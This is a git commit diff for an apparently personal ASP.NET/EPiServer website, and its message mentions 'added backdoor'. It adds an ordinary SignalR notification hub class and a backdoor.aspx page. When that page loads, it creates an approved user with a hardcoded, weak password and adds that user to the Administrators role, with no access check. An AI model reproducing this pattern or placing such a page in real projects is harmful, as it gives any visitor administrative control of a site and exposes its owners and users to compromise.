e225e8c278c5825eeb8ca24bcd082c26ddda4de6
Jon <jon.jones@share.co.uk>
2016-12-13 01:47:38 +0000

    Fixed connection string issue fixed sql logging issue, added backdoor Fixed SignalR Issue

---
+++ JonDJones.Com/App_Code/NotifactionHub.cs
@@ -0,0 +1,32 @@
+﻿using System.Collections.Generic;
+using Microsoft.AspNet.SignalR;
+
+namespace JonDJones.com.Core.NotificationCode
+{
+    public class NotificationHub : Hub
+    {
+        private readonly NotificationCentre _notificationCentre;
+
+        public NotificationHub() : this(NotificationCentre.Instance) { }
+
+        public NotificationHub(NotificationCentre notificationCentre)
+        {
+            _notificationCentre = notificationCentre;
+        }
+
+        public IEnumerable<Notification> GetNotifications()
+        {
+            return _notificationCentre.GetAllSystemNotifications();
+        }
+
+        public void MarkNotifacationsAsRead()
+        {
+            _notificationCentre.MarkNotificationAsRead();
+        }
+
+        public void DeleteAllNotifications()
+        {
+            _notificationCentre.DeleteAllNotifications();
+        }
+    }
+}
---
+++ JonDJones.Com/backdoor.aspx
@@ -0,0 +1,8 @@
+﻿<%@ Page Language="C#" AutoEventWireup="true" %>
+<%@ Import Namespace="System.Security.Policy" %>
+
+<% 
+    var user = Membership.CreateUser("episerver2", "episerver2", "episerver@episerver.com");
+    user.IsApproved = true;
+    
+    Roles.AddUserToRole("episerver2", "Administrators"); %>
